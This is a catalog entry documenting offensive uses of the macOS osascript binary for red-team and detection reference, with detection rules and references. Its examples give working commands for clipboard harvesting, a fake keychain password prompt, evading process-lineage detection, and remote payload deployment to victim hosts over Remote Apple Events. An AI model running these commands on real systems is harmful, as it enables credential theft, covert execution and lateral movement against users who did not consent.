---
trust_level: community
id: macos-collection-osascript
namespace: macos:collection:osascript
name: osascript
description: Execute AppleScripts and other OSA language scripts and commands.
author: Cedric Owens (@cedowens)
version: "1.0.0"
capabilities:
  - collection.data
  - credential.dump
  - discovery.enumerate
  - security.execution.command
  - security.defenseevasion.bypass
  - security.privilegeescalation.shell
  - network.lateralmovement
platforms:
  - macos
techniques:
  - collection
  - credential-access
  - discovery
  - execution
  - defense-evasion
  - privilege-escalation
  - lateral-movement
execution:
  template: "osascript"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "Use the osascript binary to gather sensitive clipboard data: A bash loop can gather clipboard contents over a defined time period. The following command calls /usr/bin/osascript -e 'return (the clipboard)' indefinitely every 10 seconds and writes clipboard content to a text file."
    command: "while true; do echo $(osascript -e 'return (the clipboard)') >> clipdata.txt; sleep 10; done"
  - description: "Use the osascript binary to gather system information: osascript can be used to gather the operating system version, current username, user ID, computer name, IP address, and other information."
    command: "osascript -e 'return (system info)'"
  - description: "Use the osascript binary to prompt the user for credentials: osascript can be used to generate a dialogue box and request the user to enter the keychain password."
    command: "osascript -e 'set popup to display dialog \"Keychain Access wants to use the login keychain\" & return & return & \"Please enter the keychain password\" & return default answer \"\" with icon file \"System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns\" with title \"Authentication Needed\" with hidden answer'"
  - description: "Use the osascript binary to execute a JXA (JavaScript for Automation) file.: JXA is often used by red teams (and potentially attackers) as a macOS payload, as JXA is native to macOS and can access various internal macOS APIs (such as Cocoa, Foundation, OSAKit, etc.). The osascript binary can be used to execute JXA payloads by simply running \"osascript [file.js]\" but some malware or offensive tools may also use \"osascript -l JavaScript [file.js]\"."
    command: "echo \"ObjC.import('Cocoa');\\nObjC.import('stdlib');\\nvar currentApp = Application.currentApplication();\\ncurrentApp.includeStandardAdditions = true;\\ncurrentApp.doShellScript('open -a Calculator.app');\" > calc.js && osascript -l JavaScript calc.js"
  - description: "Execute shell commands via osascript do shell script: osascript's 'do shell script' handler executes arbitrary shell commands through the AppleScript runtime. Commands spawned this way are children of osascript rather than the calling shell, which can bypass detection logic tied to specific parent-child process relationships. The 'with administrator privileges' flag triggers a native macOS authentication prompt and runs the command as root if the user authenticates, without requiring sudo."
    command: "osascript -e 'do shell script \"id\"'"
  - description: "Remote command execution over SSH using osascript do shell script: osascript's 'do shell script' handler can be invoked over an SSH session to execute arbitrary shell commands on a remote macOS host. This technique requires only SSH access to the target. Unlike when using Remote Apple Events (eppc://) with osascript, it does not require port 3031 to be accessible, Remote Apple Events to be enabled, or the target application to be running. This makes it viable against hosts where eppc:// is blocked by the firewall or disabled in System Settings, and against headless or server Macs that have no active GUI session."
    command: "ssh -i key.pem user@<TARGET_IP> 'bash -s' <<'EOF'\nosascript -e 'do shell script \"id\"'\nEOF"
  - description: "Mount SMB volume without GUI using osascript mount volume: osascript can mount an SMB share on the local machine using the 'mount volume' command. This approach bypasses the macOS GUI requirement for enabling Windows File Sharing password storage on the target, which is required when using the mount command directly. The share is mounted to /Volumes/<sharename> and its contents are immediately accessible as local files."
    command: "osascript -e 'mount volume \"smb://user:<PASSWORD>@<TARGET_IP>/share\"'"
  - description: "Remote payload deployment via Terminal.app as a Remote Apple Events proxy: The System Events application blocks remote do shell script execution via Remote Apple Events (RAE), returning a -10016 Handler Error. Terminal.app does not have this restriction and accepts remote do script commands over the eppc:// protocol. This makes Terminal.app an effective execution proxy. Payloads are Base64-encoded before transmission to avoid AppleScript parsing errors (-2741) caused by multi-line scripts. The deployment is a two-stage process - the first RAE command decodes the payload to a temporary path and sets execute permissions, and the second invokes it via bash. This technique can also be classified as a Software Deployment Tool (T1072) - it operates via Apple Events IPC rather than standard shell processes, creating a telemetry gap in security tooling focused on process execution trees."
    command: "osascript <<EOF\ntell application \"Terminal\" of machine \"eppc://${VICTIM_USER}:${VICTIM_PASS}@${VICTIM_IP}\"\n    do script \"echo \\\"${PAYLOAD_B64}\\\" | base64 --decode > ${REMOTE_SCRIPT_PATH} && chmod +x ${REMOTE_SCRIPT_PATH}\" in window 1\nend tell\nEOF\n\nosascript <<EOF\ntell application \"Terminal\" of machine \"eppc://${VICTIM_USER}:${VICTIM_PASS}@${VICTIM_IP}\"\n    do script \"bash ${REMOTE_SCRIPT_PATH}\" in window 1\nend tell\nEOF"
  - description: "Remote volume enumeration via Finder over Remote Apple Events: The Finder application is scriptable over Remote Apple Events (RAE) via the eppc:// URI scheme. osascript can address a remote Finder instance to query mounted volumes on the target machine, providing an adversary with immediate insight into available network shares and external storage. These actions are performed via Apple Events IPC rather than shell commands, bypassing security telemetry focused on process execution."
    command: "osascript -e 'tell application \"Finder\" of machine \"eppc://user:password@<TARGET_IP>\" to get name of every disk'"
install:
  - method: custom
    commands:
      - "/usr/bin/osascript"
detections:
  - type: other
    description: "Command Line Argument Detection (args contain osascript AND -e AND clipboard)"
  - type: other
    url: "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/osascript_gather_clipboard"
    description: "Jamf Protect: Detect activity that is related to osascript gathering clipboard content"
  - type: other
    url: "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/osascript_gather_system_information"
    description: "Jamf Protect: Detect activity that is related to osascript pulling system information"
  - type: other
    url: "https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/osascript_dialog_activity"
    description: "Jamf Protect: Detect activity that is related to generating dialogs using osascript and asking for specific user input"
  - type: other
    description: "Process Lineage Detection: Monitor for suspicious process trees indicative of RAS-based execution (launchd -> AppleEventsD -> Terminal -> sh/bash)"
  - type: other
    description: "Command Line Argument Detection: osascript executions containing eppc:// arguments or base64 --decode commands originating from GUI applications"
references:
  - label: "Using macOS Internals for Post Exploitation"
    url: "https://medium.com/red-teaming-with-a-blue-team-mentality/using-macos-internals-for-post-exploitation-b5faaa11e121"
  - label: "Bad Apples: Weaponizing Native macOS Primitives for Movement and Execution"
    url: "https://blog.talosintelligence.com/bad-apples-weaponizing-native-macos-primitives-for-movement-and-execution/"
---

The osascript binary is a command-line utility included in macOS that allows users to run AppleScript and Open Scripting Architecture (OSA) scripts or commands. AppleScript is a scripting language that is designed for power users to automate various tasks, application actions, and to interact with the operating system.